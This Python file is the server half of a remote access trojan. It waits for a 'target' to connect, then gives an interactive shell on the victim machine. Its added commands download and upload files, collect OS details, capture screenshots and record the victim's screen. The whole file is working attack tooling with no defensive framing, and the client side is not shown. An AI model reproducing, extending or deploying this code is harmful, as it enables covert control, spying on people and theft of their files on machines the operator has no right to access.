#!/usr/bin/env python3
import socket  # Provides low-level networking interfaces to create and manage network connections (TCP, UDP, etc.)
import json    # Provides functions for serializing/deserializing data in JSON format for structured data exchange.
import os      # Provides functions to interact with the operating system (file system operations, command execution, etc.)
import platform # This module has various functions that can be used to get the information like the OS name and its version.
import base64
import time

# Sends data to the target in a reliable JSON-encoded format
def reliable_send(data):
    jsondata = json.dumps(data)          # Convert Python object into a JSON-formatted string
    target.sendall(jsondata.encode())       # Encode the string to bytes and send it to the connected target

# Receives JSON-formatted data from the target reliably
def reliable_recv():
    data = ''                            # Buffer string to hold incoming data
    while True:                          # Keep receiving until full JSON data is obtained
        try:
            data = data + target.recv(1024).decode().rstrip()  # Receive 1024 bytes, decode to string, remove trailing spaces
            return json.loads(data)       # Parse the complete JSON string back into a Python object and return it
        except ValueError:                # If JSON is incomplete or corrupted, keep receiving more
            continue

# Downloads a file from the target
def download_file(file_name):
    f = open(file_name, 'wb')             # Open a file locally in binary write mode
    target.settimeout(1)                  # Set a timeout of 1 second for receiving data
    chunk = target.recv(1024)              # Receive first chunk of file data (1024 bytes)
    while chunk:                           # Continue until no more data is received
        f.write(chunk)                     # Write the chunk to the file
        try:
            chunk = target.recv(1024)      # Attempt to receive the next chunk
        except socket.timeout as e:        # Stop receiving if timeout occurs (no more data)
            break
    target.settimeout(None)                # Remove the timeout setting
    f.close()                              # Close the file after writing

# Uploads a file to the target
def upload_file(file_name):
    f = open(file_name, 'rb')              # Open the file in binary read mode
    target.send(f.read())                  # Read the entire file and send its contents to the target

# Receive exactly 'size' bytes from the socket
def recv_exact(sock, size):
    buf = b''                 # Buffer to store received bytes
    remaining = size          # Number of bytes remaining to receive
    while remaining > 0:
        chunk = sock.recv(4096 if remaining >= 4096 else remaining)  # Receive up to 4KB or remaining bytes
        if not chunk:         # Connection closed unexpectedly
            return None
        buf += chunk          # Append received chunk to buffer
        remaining -= len(chunk)  # Decrease remaining byte count
    return buf

# Handles communication with the connected target (sending commands, receiving results, file transfers, etc.)
def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))  # Display shell prompt showing the target's IP
        reliable_send(command)                     # Send the entered command to the target
        if command == 'exit' or command == 'quit': # If user types 'exit' or 'quit', end communication
            break
        elif command[:3] == 'cd ':                 # If command is 'cd', let the target change directory
            pass                                   # No local action needed; handled remotely
        elif command == 'clear':                   # If command is 'clear', clear local terminal
            os.system('clear')
        elif command[:8] == 'download':            # If command starts with 'download', retrieve file from target
            download_file(command[9:])              # Pass file name (after 'download ')
        elif command[:6] == 'upload':               # If command starts with 'upload', send file to target
            upload_file(command[7:])                 # Pass file name (after 'upload ')
        elif command == 'os':                       # If the command entered is 'os', wait for the target to send back system info
            result = reliable_recv()                # Receive the OS information from the target
            print(result)                           # Import platform module to gather OS details
        elif command == 'screenshot':
            resp = reliable_recv()
            if not (isinstance(resp, dict) and resp.get("type") == "screenshot" and resp.get("data")):
                print("[-] Unexpected screenshot response:", resp)
                continue

            import base64, os, time
            try:
                img_bytes = base64.b64decode(resp["data"])
                fname = f"screenshot_{int(time.time())}.png"
                path = os.path.join(os.getcwd(), fname)
                with open(path, "wb") as f:
                    f.write(img_bytes)
                print(f"[+] Screenshot saved to: {path}")   # only print; do NOT open
            except Exception as e:
                print("[-] Error saving screenshot:", e)
                
# Problems: The video is displaying on the client side
        elif command[:6] == 'record':
                    # Ask client to start recording (JSON control message)
                    try:
                        fps = 10  # default; change if you want
                        reliable_send({"type": "record_start", "fps": fps})
                    except Exception as e:
                        print(f"[-] Failed to send record_start: {e}")
                        continue

                    print("[*] Recording started on client. Press 's' then Enter to stop.")
                    # wait for 's' from user to stop recording
                    while True:
                        try:
                            key = input().strip().lower()
                        except (KeyboardInterrupt, EOFError):
                            key = 's'  # treat interrupt as stop
                        if key == 's':
                            try:
                                reliable_send({"type": "record_stop"})
                            except Exception as e:
                                print(f"[-] Failed to send record_stop: {e}")
                            break
                        else:
                            print("Press 's' then Enter to stop recording.")

                    # Receive metadata JSON from client (should be {"type":"record","filename":..., "size":...})
                    meta = reliable_recv()
                    if meta is None:
                        print("[-] No metadata received (connection closed).")
                        continue

                    if not isinstance(meta, dict):
                        print("[-] Invalid metadata format:", meta)
                        continue

                    if meta.get("type") == "record_error":
                        # client reported an error while recording
                        print("[-] Client error during recording:", meta.get("error"))
                        continue

                    if meta.get("type") != "record":
                        print("[-] Unexpected metadata type:", meta)
                        continue

                    filename = meta.get("filename")
                    try:
                        size = int(meta.get("size", 0))
                    except Exception:
                        size = 0

                    if not filename or size <= 0:
                        print("[-] Invalid recording metadata:", meta)
                        continue

                    print(f"[*] Receiving recording: {filename} ({size} bytes)...")

                    # Ensure recordings folder exists
                    save_dir = "recordings"
                    try:
                        os.makedirs(save_dir, exist_ok=True)
                    except Exception as e:
                        print("[-] Failed to create recordings directory:", e)
                        continue

                    path = os.path.join(save_dir, filename)

                    # Receive exactly `size` bytes
                    data = recv_exact(target, size)
                    if data is None:
                        print("[-] Connection closed while receiving file.")
                        continue

                    # Write to disk
                    try:
                        with open(path, "wb") as f:
                            f.write(data)
                    except Exception as e:
                        print(f"[-] Error writing recording file: {e}")
                        # optionally continue to next loop
                        continue

                    # Verify length
                    if len(data) == size:
                        print(f"[+] Recording saved: {path}")
                    else:
                        print(f"[-] Recording incomplete: saved {len(data)} of {size} bytes to {path}")

        else:
            # For any other command we expect a JSON/text result
            result = reliable_recv()
            if result is None:
                print("[-] No response (connection closed).")
                break
            print(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET refers to the address-family ipv4. The SOCK_STREAM means connection-oriented TCP protocol. 
s.bind(('<Listener IP>', 12345)) # <== change IP and port    
print('[+] Listening for connection...') 

s.listen(5) # we're going to listen up to 5 different connections.

target, ip = s.accept() # The accept method initiates a connection with the client.
print('[+] Target Connected From: ' + str(ip)) # 
target_communication() # Exchanging messages (receiving, sending, processing commands, etc.) between the server and that specific client.
